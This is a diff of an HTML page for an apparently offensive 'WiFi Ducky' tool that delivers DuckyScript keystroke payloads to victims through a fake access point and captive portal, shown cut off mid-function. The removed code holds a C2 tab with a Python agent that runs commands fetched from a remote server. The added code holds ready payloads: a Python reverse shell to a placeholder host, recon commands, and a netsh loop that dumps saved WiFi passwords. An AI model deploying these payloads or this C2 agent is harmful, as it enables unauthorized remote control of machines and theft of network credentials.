@@ -1,414 +1,225 @@
 <!DOCTYPE html>
-<!-- 
-  Pisces Moon OS — wifi_ducky.html
+<!--
+  Pisces Moon OS — wifi_ducky.html v2
   Copyright (C) 2026 Eric Becker / Fluid Fortune
-  SPDX-License-Identifier: MIT
-  fluidfortune.com
-
-  Permission is hereby granted, free of charge, to any person obtaining
-  a copy of this software and associated documentation files, to deal in
-  the Software without restriction. See licenses/LICENSE-MIT.txt for full terms.
-
-  Dedicated to Jennifer Soto and Clark Beddows.
+  SPDX-License-Identifier: AGPL-3.0-or-later
 -->
-<!-- PISCES MOON OS // WIFI DUCKY -->
-<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<html lang="en"><head><meta charset="UTF-8">
+<link rel="stylesheet" href="pm_fonts.css">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>PISCES MOON // WIFI DUCKY</title>
+<link rel="stylesheet" href="pm_shared.css">
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
-:root{--bg:#050a0e;--bg2:#080f14;--bg3:#0c1620;--panel-border:#1a3a50;--accent:#00d4ff;--accent2:#ff6b00;--accent3:#00ff88;--accent4:#ff3366;--warn:#ffcc00;--text:#7ab8d4;--text-bright:#c8e8f5;--text-dim:#2a5870;}
-*{margin:0;padding:0;box-sizing:border-box;}
-body{background:var(--bg);color:var(--text);font-family:'Share Tech Mono',monospace;min-height:100vh;display:flex;flex-direction:column;}
-body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.12) 2px,rgba(0,0,0,.12) 4px);pointer-events:none;z-index:999;}
-header{background:var(--bg2);border-bottom:2px solid rgba(0,212,255,.2);padding:12px 24px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
-.logo{font-family:'Orbitron',monospace;font-weight:900;font-size:1.1rem;color:var(--accent);letter-spacing:3px;}
-.logo span{color:var(--accent2);}
-.auth-warn{background:rgba(0,212,255,.04);border-bottom:1px solid rgba(0,212,255,.1);padding:7px 24px;font-size:.6rem;color:rgba(0,212,255,.5);flex-shrink:0;}
-.tabs{display:flex;border-bottom:1px solid var(--panel-border);flex-shrink:0;background:var(--bg2);}
-.tab{padding:10px 22px;font-family:'Orbitron',monospace;font-size:.6rem;letter-spacing:2px;cursor:pointer;color:var(--text-dim);border-bottom:2px solid transparent;transition:all .2s;}
-.tab:hover{color:var(--text);}
-.tab.active{color:var(--accent);border-bottom-color:var(--accent);}
-.view{display:none;flex:1;overflow:hidden;flex-direction:column;}
-.view.active{display:flex;}
-/* Shared */
-.ph{padding:10px 16px;border-bottom:1px solid var(--panel-border);font-family:'Orbitron',monospace;font-size:.6rem;color:var(--accent);letter-spacing:3px;display:flex;justify-content:space-between;align-items:center;background:var(--bg2);flex-shrink:0;}
-.ph .sub{color:var(--text-dim);font-size:.55rem;letter-spacing:1px;}
-.btn{padding:7px 16px;background:transparent;border:1px solid var(--accent);color:var(--accent);font-family:'Share Tech Mono',monospace;font-size:.68rem;cursor:pointer;letter-spacing:2px;transition:all .2s;}
-.btn:hover{background:var(--accent);color:var(--bg);}
-.btn.orange{border-color:var(--accent2);color:var(--accent2);}
-.btn.orange:hover{background:var(--accent2);color:var(--bg);}
-.btn.red{border-color:var(--accent4);color:var(--accent4);}
-.btn.red:hover{background:var(--accent4);color:var(--bg);}
-.btn.green{border-color:var(--accent3);color:var(--accent3);}
-.btn.green:hover{background:var(--accent3);color:var(--bg);}
-.btn.sm{padding:4px 10px;font-size:.6rem;}
-.btn:disabled{opacity:.3;cursor:not-allowed;}
-.pm-input{background:var(--bg3);border:1px solid var(--panel-border);color:var(--text-bright);font-family:'Share Tech Mono',monospace;font-size:.68rem;padding:7px 10px;outline:none;transition:border-color .2s;}
-.pm-input:focus{border-color:var(--accent);}
-.pm-select{background:var(--bg3);border:1px solid var(--panel-border);color:var(--text);font-family:'Share Tech Mono',monospace;font-size:.65rem;padding:6px 8px;outline:none;cursor:pointer;}
-/* HTTP view */
-.http-layout{display:grid;grid-template-columns:300px 1fr;flex:1;overflow:hidden;}
-.target-list{border-right:1px solid var(--panel-border);overflow-y:auto;}
-.target-row{padding:10px 14px;border-bottom:1px solid rgba(26,58,80,.3);cursor:pointer;transition:background .15s;}
-.target-row:hover{background:rgba(0,212,255,.03);}
-.target-row.selected{background:rgba(0,212,255,.07);border-left:2px solid var(--accent);}
-.t-name{font-size:.68rem;color:var(--text-bright);}
-.t-addr{font-size:.6rem;color:var(--text-dim);margin-top:2px;}
-.t-method{font-size:.55rem;padding:1px 6px;border-radius:2px;font-family:'Orbitron',monospace;display:inline-block;margin-top:3px;}
-.m-post{background:rgba(255,107,0,.1);color:var(--accent2);border:1px solid rgba(255,107,0,.3);}
-.m-get{background:rgba(0,255,136,.1);color:var(--accent3);border:1px solid rgba(0,255,136,.3);}
-.m-ssh{background:rgba(255,204,0,.1);color:var(--warn);border:1px solid rgba(255,204,0,.3);}
-.req-panel{display:flex;flex-direction:column;overflow:hidden;}
-.req-bar{padding:10px 16px;border-bottom:1px solid var(--panel-border);display:flex;gap:8px;align-items:center;flex-shrink:0;background:var(--bg2);flex-wrap:wrap;}
-.req-body{flex:1;overflow:hidden;display:flex;flex-direction:column;}
-textarea.payload-input{flex:1;background:var(--bg3);color:var(--accent);font-family:'Share Tech Mono',monospace;font-size:.7rem;padding:14px;border:none;outline:none;resize:none;line-height:1.8;}
-.resp-panel{height:180px;border-top:1px solid var(--panel-border);display:flex;flex-direction:column;flex-shrink:0;}
-.resp-header{padding:7px 16px;background:var(--bg2);border-bottom:1px solid var(--panel-border);display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
-.resp-title{font-family:'Orbitron',monospace;font-size:.55rem;color:var(--accent);letter-spacing:2px;}
-.resp-body{flex:1;overflow-y:auto;padding:8px 16px;font-size:.64rem;line-height:1.8;}
-.r-ok{color:var(--accent3);}.r-err{color:var(--accent4);}.r-info{color:var(--text-dim);}.r-data{color:var(--accent);}
-/* C2 view */
-.c2-layout{display:grid;grid-template-columns:1fr 1fr;flex:1;overflow:hidden;gap:0;}
-.c2-panel{display:flex;flex-direction:column;border-right:1px solid var(--panel-border);overflow:hidden;}
-.c2-panel:last-child{border-right:none;}
-.c2-ctrl{padding:12px 16px;border-bottom:1px solid var(--panel-border);background:var(--bg2);flex-shrink:0;}
-.c2-info{font-size:.6rem;color:var(--text-dim);line-height:2;margin-bottom:8px;}
-.c2-info code{color:var(--accent);font-size:.58rem;}
-.c2-log{flex:1;overflow-y:auto;padding:10px 16px;font-size:.63rem;line-height:1.8;}
-.c2-input-bar{padding:10px 16px;border-top:1px solid var(--panel-border);display:flex;gap:8px;flex-shrink:0;background:var(--bg2);}
-/* Add target form */
-.add-target-form{padding:14px 16px;border-bottom:1px solid var(--panel-border);background:var(--bg2);display:none;}
-.add-target-form.show{display:block;}
-.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px;}
-.form-grid .pm-input,.form-grid .pm-select{width:100%;}
-.pill{padding:3px 10px;border:1px solid;border-radius:2px;font-family:'Orbitron',monospace;font-size:.55rem;letter-spacing:2px;}
-.pill.active{border-color:var(--accent3);color:var(--accent3);animation:blink .8s step-end infinite;}
-.pill.idle{border-color:var(--text-dim);color:var(--text-dim);}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
-::-webkit-scrollbar{width:4px;} ::-webkit-scrollbar-track{background:var(--bg3);} ::-webkit-scrollbar-thumb{background:var(--panel-border);}
-</style></head><body>
-<header>
-  <div class="logo"><span>WIFI</span> DUCKY</div>
-  <div style="display:flex;align-items:center;gap:12px">
-    <span style="font-size:.62rem;color:var(--text-dim)">Network Payload Delivery // Pisces Moon OS</span>
-    <span class="pill idle" id="statusPill">IDLE</span>
-  </div>
+.dk-layout{display:grid;grid-template-columns:280px 1fr 260px;height:calc(100vh - 52px);overflow:hidden}
+.dk-left{border-right:1px solid var(--panel-border);overflow-y:auto}
+.dk-right{border-left:1px solid var(--panel-border);overflow-y:auto;padding:12px}
+.dk-center{display:flex;flex-direction:column;overflow:hidden}
+.payload-item{padding:10px 12px;border-bottom:1px solid rgba(28,46,58,.4);cursor:pointer;transition:background .15s}
+.payload-item:hover{background:rgba(gold,0.04)}
+.payload-item.selected{background:rgba(0,0,0,.1);border-left:2px solid var(--gold)}
+.payload-name{font-size:.72rem;color:var(--text-bright);margin-bottom:3px}
+.payload-meta{font-size:.58rem;color:var(--text-dim);display:flex;gap:8px}
+.payload-os{display:inline-block;padding:1px 5px;font-family:Orbitron,monospace;font-size:.45rem;border:1px solid var(--panel-border);color:var(--text-dim)}
+.editor{flex:1;display:flex;flex-direction:column;overflow:hidden}
+textarea.payload-editor{flex:1;background:var(--bg3);border:none;border-bottom:1px solid var(--panel-border);color:var(--accent3);font-family:Share\ Tech\ Mono,monospace;font-size:.72rem;padding:14px;resize:none;outline:none;line-height:1.8}
+.controls{padding:10px 12px;border-bottom:1px solid var(--panel-border);background:var(--bg2);display:flex;gap:8px;flex-wrap:wrap}
+.btn{padding:6px 14px;background:transparent;border:1px solid var(--gold);color:var(--gold);font-family:Share\ Tech\ Mono,monospace;font-size:.62rem;cursor:pointer;letter-spacing:2px;transition:all .15s}
+.btn:hover{background:var(--gold);color:var(--bg)}
+.btn.danger{border-color:var(--accent4);color:var(--accent4)}
+.btn.danger:hover{background:var(--accent4);color:var(--bg)}
+.exec-log{padding:8px 12px;font-family:Share\ Tech\ Mono,monospace;font-size:.62rem;line-height:1.8;color:var(--accent3);overflow-y:auto;max-height:150px;border-top:1px solid var(--panel-border);background:var(--bg)}
+.timing-control{display:flex;align-items:center;gap:8px;font-size:.6rem;color:var(--text-dim)}
+input[type=range]{accent-color:var(--gold)}
+</style>
+</head><body>
+<header class="pm-header">
+    <div class="pm-logo">📡 <em>WIFI</em> DUCKY</div>
+    <div class="pm-hdr-right">
+        <div class="pm-live-badge" id="liveBadge" style="opacity:.3"><div class="pm-live-dot"></div>READY</div>
+        <span class="pm-last-update" id="lastUpdate"></span>
+    </div>
 </header>
-<div class="auth-warn">⚠ USE ONLY ON SYSTEMS YOU OWN OR HAVE EXPLICIT AUTHORIZATION TO TEST — Network-based payload delivery</div>
-
-<div class="tabs">
-  <div class="tab active" onclick="switchTab('http',this)">HTTP POST/GET</div>
-  <div class="tab" onclick="switchTab('c2',this)">REVERSE C2</div>
-  <div class="tab" onclick="switchTab('targets',this)">TARGETS</div>
-</div>
-
-<!-- HTTP VIEW -->
-<div class="view active" id="view-http">
-  <div class="http-layout">
-    <div class="target-list">
-      <div class="ph" style="font-size:.55rem">TARGETS</div>
-      <div id="targetListHTTP"></div>
-      <div style="padding:10px 14px;border-top:1px solid var(--panel-border)">
-        <button class="btn sm" onclick="switchTab('targets',document.querySelectorAll('.tab')[2])">MANAGE TARGETS</button>
-      </div>
+<div class="dk-layout">
+    <div class="dk-left">
+        <div class="pm-sh" style="position:sticky;top:0;z-index:10">PAYLOAD LIBRARY</div>
+        <div id="payloadList"></div>
+        <div style="padding:10px 12px;border-top:1px solid var(--panel-border)">
+            <button class="btn" style="width:100%" onclick="newPayload()">+ NEW PAYLOAD</button>
+        </div>
     </div>
-    <div class="req-panel">
-      <div class="req-bar">
-        <button class="btn orange" id="sendBtn" onclick="sendRequest()" disabled>▶ SEND</button>
-        <select class="pm-select" id="methodSelect" onchange="updateMethodUI()">
-          <option value="POST">HTTP POST</option>
-          <option value="GET">HTTP GET</option>
+    <div class="dk-center">
+        <div class="controls">
+            <button class="btn" id="btnExec" onclick="executePayload()">▶ EXECUTE</button>
+            <button class="btn" onclick="stopExecution()">◼ STOP</button>
+            <button class="btn" onclick="savePayload()">💾 SAVE</button>
+            <button class="btn danger" onclick="deletePayload()">DELETE</button>
+            <div class="timing-control">
+                <span>DELAY:</span>
+                <input type="range" id="delaySlider" min="0" max="500" value="50" style="width:80px" oninput="updateDelay(this.value)">
+                <span id="delayVal">50ms</span>
+            </div>
+        </div>
+        <div class="editor">
+            <div style="padding:6px 14px;background:var(--bg2);border-bottom:1px solid var(--panel-border);display:flex;justify-content:space-between;align-items:center">
+                <span style="font-family:Orbitron,monospace;font-size:.52rem;letter-spacing:2px;color:var(--text-dim)" id="payloadTitle">SELECT OR CREATE A PAYLOAD</span>
+                <span style="font-size:.58rem;color:var(--text-dim)" id="lineCount">0 lines</span>
+            </div>
+            <textarea class="payload-editor" id="payloadEditor" placeholder="# DuckyScript payload&#10;# Example:&#10;DELAY 500&#10;GUI r&#10;DELAY 500&#10;STRING cmd&#10;ENTER&#10;DELAY 500&#10;STRING whoami&#10;ENTER" oninput="onEditorChange()"></textarea>
+        </div>
+        <div class="exec-log" id="execLog">Ready. Select a payload and click EXECUTE.</div>
+    </div>
+    <div class="dk-right">
+        <div style="font-family:Orbitron,monospace;font-size:.55rem;letter-spacing:2px;color:var(--gold);margin-bottom:10px">TRANSPORT: WIFI</div>
+        <div style="font-size:.65rem;color:var(--text-dim);line-height:1.8;margin-bottom:14px">Serves payload over WiFi.
+Target connects to a fake access point.
+Captive portal delivers the payload.</div>
+        <div style="font-family:Orbitron,monospace;font-size:.52rem;letter-spacing:2px;color:var(--gold);margin-bottom:8px;margin-top:14px">TARGET OS DETECT</div>
+        <select id="targetOS" style="width:100%;background:var(--bg3);border:1px solid var(--panel-border);color:var(--text);font-family:Share\ Tech\ Mono,monospace;font-size:.62rem;padding:6px;margin-bottom:10px">
+            <option>Auto-detect</option>
+            <option>Windows</option>
+            <option>macOS</option>
+            <option>Linux</option>
         </select>
-        <input class="pm-input" id="pathOverride" placeholder="/exec" style="width:140px">
-        <span style="font-size:.6rem;color:var(--text-dim);margin-left:auto" id="reqStatus">Select a target</span>
-      </div>
-      <div class="req-body">
-        <div style="padding:8px 16px;font-size:.6rem;color:var(--text-dim);border-bottom:1px solid var(--panel-border);flex-shrink:0">PAYLOAD BODY (POST) / QUERY STRING (GET)</div>
-        <textarea class="payload-input" id="payloadBody" placeholder="# Payload to send
-# For HTTP POST: sent as request body (Content-Type: text/plain)
-# For HTTP GET: append to URL as ?q=...
-# For authorized shell injection testing:
-echo 'Pisces Moon WiFi Ducky'
-whoami
-id
-uname -a"></textarea>
-      </div>
-      <div class="resp-panel">
-        <div class="resp-header">
-          <span class="resp-title">RESPONSE</span>
-          <div style="display:flex;align-items:center;gap:8px">
-            <span style="font-size:.58rem;color:var(--text-dim)" id="respStatus">—</span>
-            <button class="btn sm" onclick="clearResp()">CLEAR</button>
-          </div>
+        <div style="font-family:Orbitron,monospace;font-size:.52rem;letter-spacing:2px;color:var(--gold);margin-bottom:8px">EXECUTION STATUS</div>
+        <canvas id="exec-progress" width="236" height="80"></canvas>
+        <div id="execStatus" style="font-size:.62rem;color:var(--text-dim);margin-top:8px;line-height:1.8"></div>
+        <div style="font-family:Orbitron,monospace;font-size:.52rem;letter-spacing:2px;color:var(--gold);margin-top:14px;margin-bottom:8px">QUICK PAYLOADS</div>
+        
+        <div style="margin-top:6px">
+            <button class="btn" style="width:100%;margin-bottom:4px" onclick="loadQuick('recon_windows')">Recon Windows</button>
+            <button class="btn" style="width:100%;margin-bottom:4px" onclick="loadQuick('recon_mac')">Recon macOS</button>
+            <button class="btn" style="width:100%;margin-bottom:4px" onclick="loadQuick('reverse_shell')">Rev Shell Template</button>
+            <button class="btn" style="width:100%;" onclick="loadQuick('exfil_wifi')">WiFi Creds Dump</button>
         </div>
-        <div class="resp-body" id="respBody">
-          <span class="r-info">// Response will appear here after sending request.</span><br>
-          <span class="r-info">// Real requests use fetch() or window.spadra.system.exec curl pipeline.</span><br>
-        </div>
-      </div>
     </div>
-  </div>
 </div>
-
-<!-- C2 VIEW -->
-<div class="view" id="view-c2">
-  <div class="c2-layout">
-    <!-- Server control -->
-    <div class="c2-panel">
-      <div class="ph">C2 SERVER <span class="sub" id="c2StatusLabel">Stopped</span></div>
-      <div class="c2-ctrl">
-        <div class="c2-info">
-          This machine acts as a lightweight HTTP C2 server.<br>
-          Target polls <code>GET /cmd</code> and POSTs output to <code>/result</code>.<br><br>
-          Target agent (Python):
-        </div>
-        <pre style="background:var(--bg3);padding:8px;font-size:.55rem;color:var(--accent);line-height:1.8;overflow-x:auto">import requests,subprocess,time
-C2='http://&lt;YOUR_IP&gt;:7070'
-while True:
-  r=requests.get(C2+'/cmd')
-  if r.text.strip():
-    o=subprocess.check_output(r.text,shell=1,text=1,stderr=subprocess.STDOUT)
-    requests.post(C2+'/result',data=o)
-  time.sleep(2)</pre>
-        <div style="display:flex;gap:8px;margin-top:10px">
-          <button class="btn green sm" id="c2StartBtn" onclick="startC2()">▶ START SERVER</button>
-          <button class="btn red sm" id="c2StopBtn" onclick="stopC2()" disabled>■ STOP</button>
-          <span style="font-size:.6rem;color:var(--text-dim);margin-left:auto">Port 7070</span>
-        </div>
-      </div>
-      <div class="c2-log" id="c2ServerLog">
-        <span class="r-info">// C2 server log will appear here.</span><br>
-        <span class="r-info">// Real server: window.spadra launches Python HTTP server.</span><br>
-      </div>
-    </div>
-    <!-- Command terminal -->
-    <div class="c2-panel">
-      <div class="ph">COMMAND TERMINAL <span class="sub" id="c2ResultLabel">No output yet</span></div>
-      <div class="c2-log" id="c2OutputLog" style="background:var(--bg3)">
-        <span class="r-info">// Target output will appear here in real-time.</span><br>
-      </div>
-      <div class="c2-input-bar">
-        <span style="color:var(--accent2);font-size:.7rem">C2&gt;</span>
-        <input class="pm-input" id="c2Cmd" placeholder="command to send..." style="flex:1" onkeydown="if(event.key==='Enter')sendC2Cmd()">
-        <button class="btn orange sm" onclick="sendC2Cmd()">SEND</button>
-        <button class="btn sm" onclick="clearC2Output()">CLEAR</button>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- TARGETS VIEW -->
-<div class="view" id="view-targets">
-  <div class="ph">TARGET MANAGEMENT
-    <button class="btn sm green" onclick="toggleAddForm()">+ ADD TARGET</button>
-  </div>
-  <div class="add-target-form" id="addTargetForm">
-    <div class="form-grid">
-      <input class="pm-input" id="tName"   placeholder="Name (e.g. TestBox)">
-      <input class="pm-input" id="tIP"     placeholder="IP address">
-      <input class="pm-input" id="tPort"   placeholder="Port" value="8080">
-      <select class="pm-select" id="tMethod"><option>POST</option><option>GET</option><option>SSH</option><option>REVERSE</option></select>
-      <input class="pm-input" id="tPath"   placeholder="Path (e.g. /exec)" style="grid-column:span 2">
-    </div>
-    <div style="display:flex;gap:8px">
-      <button class="btn sm green" onclick="addTarget()">ADD</button>
-      <button class="btn sm" onclick="toggleAddForm()">CANCEL</button>
-    </div>
-  </div>
-  <div style="flex:1;overflow-y:auto" id="targetListMgmt"></div>
-</div>
-
+<script src="pm_scraper.js"></script>
+<script src="pm_viz.js"></script>
+<script src="pm_transport.js"></script>
 <script>
-// ── State ─────────────────────────────────────────────────────────────────
-let targets = [
-  {name:'Local Test Server', ip:'127.0.0.1', port:8080, method:'POST', path:'/exec', user:'', pass:''},
-  {name:'HTTP GET Target',   ip:'192.168.1.100', port:80, method:'GET',  path:'/run', user:'', pass:''},
-  {name:'SSH Target',        ip:'192.168.1.101', port:22, method:'SSH',  path:'',     user:'user', pass:''},
+const TRANSPORT_CMD="CMD_WIFI_DUCKY";
+const QUICK_PAYLOADS={
+    recon_windows:`# Windows Recon\nDELAY 500\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1000\nSTRING whoami && hostname && ipconfig && net user\nENTER`,
+    recon_mac:`# macOS Recon\nDELAY 500\nGUI SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 1000\nSTRING whoami && hostname && ifconfig && id\nENTER`,
+    reverse_shell:`# Reverse Shell Template (edit IP/PORT)\n# Change TARGET_IP and PORT before use\nDELAY 500\nSTRING python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TARGET_IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'\nENTER`,
+    exfil_wifi:`# Dump WiFi Credentials (Windows)\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd /k netsh wlan show profiles\nENTER\nDELAY 1000\nSTRING for /f "tokens=2 delims=:" %i in ('netsh wlan show profiles') do @netsh wlan show profiles %i key=clear\nENTER`,
+};
+
+let payloads=PM.load("ducky_wifi_payloads")||[
+    {id:"p1",name:"Hello World",os:"All",content:"DELAY 500\nSTRING Hello from Pisces Moon!\nENTER"},
+    {id:"p2",name:"Open Notepad (Win)",os:"Windows",content:"DELAY 500\nGUI r\nDELAY 500\nSTRING notepad\nENTER"},
 ];
-let selectedTarget = null;
-let c2Running = false;
-let c2PendingCmd = '';
-let c2Timer = null;
+let selectedPID=null, executing=false, execDelay=50;
+let progressSpark;
 
-// ── Tab switching ──────────────────────────────────────────────────────────
-function switchTab(id, el) {
-  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
-  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
-  document.getElementById('view-'+id).classList.add('active');
-  el.classList.add('active');
-  if (id==='http'||id==='targets') renderTargetLists();
+const beam=new PMTransport({onMessage:handleData,onStatus:(s)=>{document.getElementById("liveBadge").style.opacity=s.state==="connected"?"1":"0.3";document.getElementById("lastUpdate").textContent=s.message;}});
+
+function handleData(msg){if(msg.type==="DUCKY_STATUS")updateExecStatus(msg);}
+
+function initViz(){progressSpark=new PMViz.Sparkline("exec-progress",{color:"var(--gold)",maxPts:30});}
+
+function renderPayloadList(){
+    document.getElementById("payloadList").innerHTML=payloads.map(p=>`
+        <div class="payload-item ${selectedPID===p.id?"selected":""}" onclick="selectPayload('${p.id}')">
+            <div class="payload-name">${PM.esc(p.name)}</div>
+            <div class="payload-meta">
+                <span class="payload-os">${PM.esc(p.os||"All")}</span>
+                <span>${p.content.split("\n").length} lines</span>
+            </div>
+        </div>`).join("");
 }
 
-// ── Target management ──────────────────────────────────────────────────────
-function renderTargetLists() {
-  // HTTP sidebar
-  document.getElementById('targetListHTTP').innerHTML = targets.map((t,i)=>`
-    <div class="target-row ${selectedTarget===i?'selected':''}" onclick="selectTarget(${i})">
-      <div class="t-name">${esc(t.name)}</div>
-      <div class="t-addr">${t.ip}:${t.port}${t.path}</div>
-      <span class="t-method m-${t.method.toLowerCase()}">${t.method}</span>
-    </div>`).join('');
-
-  // Management list
-  document.getElementById('targetListMgmt').innerHTML = targets.map((t,i)=>`
-    <div style="padding:12px 16px;border-bottom:1px solid rgba(26,58,80,.3);display:grid;grid-template-columns:1fr auto;gap:10px;align-items:center">
-      <div>
-        <div style="font-size:.68rem;color:var(--text-bright)">${esc(t.name)}</div>
-        <div style="font-size:.6rem;color:var(--text-dim);margin-top:2px">${t.method} — ${t.ip}:${t.port}${t.path}</div>
-      </div>
-      <button class="btn red sm" onclick="removeTarget(${i})">REMOVE</button>
-    </div>`).join('');
+function selectPayload(id){
+    selectedPID=id;
+    const p=payloads.find(x=>x.id===id); if(!p) return;
+    document.getElementById("payloadEditor").value=p.content;
+    document.getElementById("payloadTitle").textContent=p.name;
+    onEditorChange();
+    renderPayloadList();
 }
 
-function selectTarget(i) {
-  selectedTarget = i;
-  const t = targets[i];
-  document.getElementById('methodSelect').value = t.method==='SSH'||t.method==='REVERSE' ? 'POST' : t.method;
-  document.getElementById('pathOverride').value = t.path;
-  document.getElementById('reqStatus').textContent = `${t.name} — ${t.ip}:${t.port}`;
-  document.getElementById('sendBtn').disabled = false;
-  renderTargetLists();
+function onEditorChange(){
+    const lines=document.getElementById("payloadEditor").value.split("\n").length;
+    document.getElementById("lineCount").textContent=`${lines} lines`;
 }
 
-function toggleAddForm() {
-  document.getElementById('addTargetForm').classList.toggle('show');
-}
-function addTarget() {
-  const t = {
-    name:  document.getElementById('tName').value  || 'New Target',
-    ip:    document.getElementById('tIP').value    || '0.0.0.0',
-    port:  parseInt(document.getElementById('tPort').value)||80,
-    method:document.getElementById('tMethod').value,
-    path:  document.getElementById('tPath').value  || '/',
-    user:'', pass:''
-  };
-  targets.push(t);
-  renderTargetLists();
-  toggleAddForm();
-}
-function removeTarget(i) { targets.splice(i,1); if(selectedTarget===i) selectedTarget=null; renderTargetLists(); }
-
-// ── HTTP request ───────────────────────────────────────────────────────────
-function updateMethodUI() {
-  const m = document.getElementById('methodSelect').value;
-  document.getElementById('payloadBody').placeholder = m==='GET' ?
-    'Query string or leave empty for plain GET' : '# Payload body (sent as text/plain)';
+function executePayload(){
+    const content=document.getElementById("payloadEditor").value.trim();
+    if(!content){alert("No payload loaded");return;}
+    executing=true;
+    addLog("Executing payload...");
+    if(beam.connected) beam.send({type:TRANSPORT_CMD,src:"app",cmd_id:"dk1",payload:content,delay_ms:execDelay,target_os:document.getElementById("targetOS").value});
+    else simulateExecution(content);
 }
 
-async function sendRequest() {
-  if (selectedTarget===null) return;
-  const t = targets[selectedTarget];
-  const method = document.getElementById('methodSelect').value;
-  const path   = document.getElementById('pathOverride').value || t.path;
-  const body   = document.getElementById('payloadBody').value;
-  const url    = `http://${t.ip}:${t.port}${path}`;
+function simulateExecution(content){
+    const lines=content.split("\n").filter(l=>l&&!l.startsWith("#"));
+    let i=0;
+    const interval=setInterval(()=>{
+        if(i>=lines.length||!executing){clearInterval(interval);addLog("Execution complete");return;}
+        addLog(`> ${lines[i]}`);
+        progressSpark.push(i/lines.length*100);
+        i++;
+    },execDelay+50);
+}
 
-  document.getElementById('statusPill').className = 'pill active';
-  document.getElementById('statusPill').textContent = 'SENDING';
-  document.getElementById('sendBtn').disabled = true;
-  document.getElementById('respStatus').textContent = 'Waiting...';
+function stopExecution(){executing=false;addLog("Execution stopped");}
 
-  respLog(`// ${method} ${url}`, 'r-info');
-
-  try {
-    const opts = {method, mode:'cors'};
-    if (method==='POST') {
-      opts.headers = {'Content-Type':'text/plain'};
-      opts.body = body;
+function savePayload(){
+    const content=document.getElementById("payloadEditor").value;
+    if(!selectedPID){
+        const id="p"+Date.now();
+        payloads.push({id,name:"New Payload",os:"All",content});
+        selectedPID=id;
+    }else{
+        const p=payloads.find(x=>x.id===selectedPID); if(p) p.content=content;
     }
-    const resp = await fetch(url, opts);
-    const text = await resp.text();
-    respLog(`// HTTP ${resp.status} ${resp.statusText}`, resp.ok?'r-ok':'r-err');
-    if (text) text.split('\n').slice(0,20).forEach(l=>respLog(l,'r-data'));
-    document.getElementById('respStatus').textContent = `HTTP ${resp.status}`;
-  } catch(e) {
-    // Expected in demo — CORS/network error
-    respLog(`// ${e.message}`, 'r-err');
-    respLog('// In production: window.spadra.system.exec curl pipeline bypasses CORS', 'r-info');
-    respLog(`// Real cmd: curl -s -X ${method} -d @payload "${url}"`, 'r-info');
-    document.getElementById('respStatus').textContent = 'Network error (demo)';
-  }
-
-  document.getElementById('statusPill').className = 'pill idle';
-  document.getElementById('statusPill').textContent = 'IDLE';
-  document.getElementById('sendBtn').disabled = false;
+    PM.save("ducky_wifi_payloads",payloads);
+    renderPayloadList();
+    addLog("Payload saved");
 }
 
-function respLog(msg,cls='r-info'){const b=document.getElementById('respBody');const s=document.createElement('span');s.className=cls;s.textContent=msg;b.appendChild(s);b.appendChild(document.createElement('br'));b.scrollTop=b.scrollHeight;}
-function clearResp(){document.getElementById('respBody').innerHTML='';}
-
-// ── C2 server ──────────────────────────────────────────────────────────────
-function startC2() {
-  c2Running = true;
-  document.getElementById('c2StartBtn').disabled = true;
-  document.getElementById('c2StopBtn').disabled = false;
-  document.getElementById('c2StatusLabel').textContent = 'Running :7070';
-  document.getElementById('statusPill').className = 'pill active';
-  document.getElementById('statusPill').textContent = 'C2 ACTIVE';
-  c2Log('// C2 server started on port 7070', 'r-ok');
-  c2Log('// In production: window.spadra launches Python http.server subprocess', 'r-info');
-  c2Log('// Polling /cmd every 2s — waiting for target agent...', 'r-info');
-
-  // Simulate target connecting after a delay
-  setTimeout(simulateTargetConnect, 3000);
+function deletePayload(){
+    if(!selectedPID)return;
+    if(!confirm("Delete this payload?"))return;
+    payloads=payloads.filter(p=>p.id!==selectedPID);
+    selectedPID=null;
+    PM.save("ducky_wifi_payloads",payloads);
+    document.getElementById("payloadEditor").value="";
+    document.getElementById("payloadTitle").textContent="SELECT OR CREATE A PAYLOAD";
+    renderPayloadList();
 }
 
-function stopC2() {
-  c2Running = false;
-  clearInterval(c2Timer);
-  document.getElementById('c2StartBtn').disabled = false;
-  document.getElementById('c2StopBtn').disabled = true;
-  document.getElementById('c2StatusLabel').textContent = 'Stopped';
-  document.getElementById('statusPill').className = 'pill idle';
-  document.getElementById('statusPill').textContent = 'IDLE';
-  c2Log('// C2 server stopped.', 'r-info');
+function newPayload(){
+    const name=prompt("Payload name:"); if(!name) return;
+    const id="p"+Date.now();
+    payloads.push({id,name,os:"All",content:"# New payload\nDELAY 500\n"});
+    PM.save("ducky_wifi_payloads",payloads);
+    selectPayload(id);
+    renderPayloadList();
 }
 
-function simulateTargetConnect() {
-  if (!c2Running) return;
-  c2Log('// [SIM] Target agent connected from 192.168.1.55', 'r-ok');
-  c2Log('// Ready — type command in the terminal and press SEND', 'r-info');
+function loadQuick(key){
+    document.getElementById("payloadEditor").value=QUICK_PAYLOADS[key]||"";
+    document.getElementById("payloadTitle").textContent=key.replace(/_/g," ").toUpperCase();
+    onEditorChange();
 }
 
-function sendC2Cmd() {
-  const cmd = document.getElementById('c2Cmd').value.trim();
-  if (!cmd) return;
-  c2PendingCmd = cmd;
-  document.getElementById('c2Cmd').value = '';
-  c2Log(`// CMD queued: ${cmd}`, 'r-data');
+function updateDelay(v){execDelay=parseInt(v);document.getElementById("delayVal").textContent=v+"ms";}
 
-  if (!c2Running) {
-    c2Log('// Server not running — start C2 server first', 'r-err');
-    return;
